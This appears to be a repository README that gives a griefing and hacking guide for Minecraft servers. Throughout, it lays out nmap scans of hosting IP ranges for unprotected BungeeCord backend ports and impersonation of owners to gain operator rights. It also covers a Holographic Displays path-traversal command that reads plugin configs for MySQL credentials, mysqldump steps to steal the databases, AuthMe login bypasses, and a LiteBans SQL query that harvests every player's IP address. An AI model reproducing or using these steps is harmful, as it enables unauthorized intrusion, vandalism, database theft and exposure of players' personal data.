# Frozen-Minecraft-Griffing-30-method-Server-
                                                                            
																			MINECRAFT SERVER GRIEFING/HACKING By ItsJokerz_ / FrozenCode
																			
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

So first you wanna do is to buy Linux vps (ubuntu,debian,CentOS anything but needs to be based on linux). I recommend using bungeecloud.org 1$ vps.
You will be using it only for nmap scanning.
Download mobaxterm is best SSH client to connect to the VPS. (FTP & SSH in one tool).
So when u buy install nmap on it (Write on vps: apt-get install nmap) its important cause you will use that tool to scan ports and ipranges of minecraft OVH host.

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

PORT SCANNING METHOD:

Go to this site: https://ipinfo.io/AS16276 (ipv4 ranges). Now you will see big shit of ip ranges. What u need to do is to choose 1 for example I will be choosing 149.202.*.* one. Keep in mind only first 2 ranges are important,example (149.202,37.59,157.123,164.132.....)
Now when u install nmap use this command for scanning. nmap -p 25000-30000 -oN scanresult.txt --open -A -T5 -Pn 149.202.(any number between 0-255) .0-255. (example 149.202.120.0-255) hit enter and wait for scan to finish. (It takes some time) The scanresult.txt will be save in ur root directory.
So when ur scan is finish you will see bunch of ports. Now launch ur minecraft and download skillclient 1.8 from skillclient.com. Enable Bungeehack and try each ip and port manually in direct conect. If you got luck you can find subservers of big server. Like (IP:PORT)
For example I found lokapsos.com (300 players on 149.202. range back in the days) (PORTS ARE MODES ON BUNGEE! hopefully unprotected) So when u join look for /pl and scoreboard (scoreboard usually gives u real ip of server,then search that ip on google and find owner, join the server with owner nick, and do /op yournick then join with your nick on real bungee ip of server and join mode that you found trought bungee. 
And woala you are opped. 
If server is premium. I mean bungee ip is premium for example mineplex.com then go to alts mannager in skillclient and DISABLE offline UUID on alt.And join port you found and op yourself.
Next bugs you can use are UUID spoof (search on yt. to explain here (but its only used when u found prelobby/authlobby or lobby port of a server, mostly patched))

** My Personal Suggestions: **

THERE ARE 2 WAYS OF SCANNING: IP RANGE SCANNING AND IP SCANNING:
----------------------------------------------------------------

:IP RANGE IS TO SCAN A LOT OF IPS AND IF YOU ARE LUCKY YOU FIND DIFFERENT SERVERS'S GAMEMODES:
 On nmap would be like (Example IP range) 0.0.0.* (It would scan all ips from 0.0.0.0 to 0.0.0.255) it will take a bit more but, it will give you more servers. (A list with a lot of ip ranges on the other txt file!)
 
:IP SCANNING: SCANS JUST THE IP THAT YOU WANT TO GRIEF:
 You have just add the ip of the server in nmap without changing anything, lower posibilities of griefing it but less time consuming.


If you want to scan fast and get results:

Use on nmap this command : 
nmap -p 1-20,24-50,100,200,300,400,500,600,700,800,900,777,1000-1010,2000-2020,12345,25500-25600,10001-10020,20001-20020,30000-30005,40001-40010,50001-50010,60001-60010 -T5 -v --open -A -oN shortscan.txt (IP or range of ips)

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

If you want to scan a server like HolyHCF. Scan the bungee ip on nmap with a simple command like this:
nmap -p 1-65535 -T4 -A -v (ServerIP/Domain) ---> In this case it would be like this ---> nmap -p 1-65535 -T4 -A --open -v holyh.cf | And hit enter and wait for open ports and try to join them with SkillClient!
                           *(MOST SERVER HAVE THEIR GAMEMODES AN IP DIFERENT THAN THE MAIN SERVER BUNGEECORD IP, SO THIS WILL WORK ONLY IF YOU ARE LUCKY)*

MYSQL Getting:
---------------------------

So how to get mysql database ? Well you need to have op on the server and server must be running Holographic displays plugin 2.1.* or 2.2* (with newest version exploit won't work.)
Issue this command. /hd create a then /hd readtext a ../PermissionEx/config.yml, basically u are opening root directory trough holographic displays plugin. Just use common sense cause most of permissions plugins are connected to mysql.
Example of how it looks when issued:  https://i.imgur.com/Wl40u93.png  https://i.imgur.com/ALWGvZJ.png just example of two servers i hacked before. With those just install sql server in linux and connect using those. And thats it.

This works for reading other plugins config!
Just use /hd readtext a ../(PluginName)/config.yml and it will appear!


                                                                                             *OP method using this!!: *
																							 
I recommend making a localhost with the same permissions plugin and adding the same info you got from the server (sql info / password), so if you pex yourself from your localhost, it will apply to the server's mysql too, so you will have perms
on the server you griefed just from your localhost console, as it were the same console!
 
 
                                                                             How to dump and download the databases of the server?

                                                                     Download mysql to your vps (ON vps write: 'apt-get install mysql-server')
When you have it installed, write :  ' mysql -u (user from the info you got) -h (ip you got) -p ' Hit enter
Then it will ask for a password: (paste the password you got from the hologram)
And boom, you are inside the server's MYSQL!

to get the databases, write: ' show databases; ' and it will tell you all databases, to download them, write: ' mysqldump -u (same user) -p -h (same ip u got) (here u write the database name u want to download) > dump.sql '
Now you wait some time... After that the database will be downloaded on your vps's root directory, download it and read it with some text processor like notepad++.


                                    So short version to summary all of this:  scan ipranges/ip > find ports > try them > op urself >grief server > dump mysql.
									
									
									
									
									
									
									
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
                                                                                               OTHER EXPLOITS:

                                                                                                AUTHME BYPASS:

It depends on the server and most of them are patched but you have to try them!... Some ways to do it are:

Use commands like: /lobby , /hub , /server , /connect , /hcf , /practice , /kitmap (Use them on auth-lobby)

Other ways are using cheats like:

Using FREECAM to water portals, or regions that teleport to the main hub, then disable it and it will teleport to de hub, bypassing authme!
Using FLY to go to Regions that teleport to main hub.
Using Teleport of skillclient to do the same thing as i said before.
 
                                                                              GETTING ALL SERVER'S IP DATABASE FROM LITEBANS:

If a server has the plugin called LiteBans and you have OP, you can get EVERYONE Who entered the server's IP.

Warning: To do it you need to be on a vanilla minecraft or optifine, not skillclient or other modded client!

So to do it you have to use this command: ' /litebans sqlexec select * from {history} '
After that, go to your \AppData\Roaming\.minecraft\logs and on latest.txt it should be a list with all the ips and nicks!


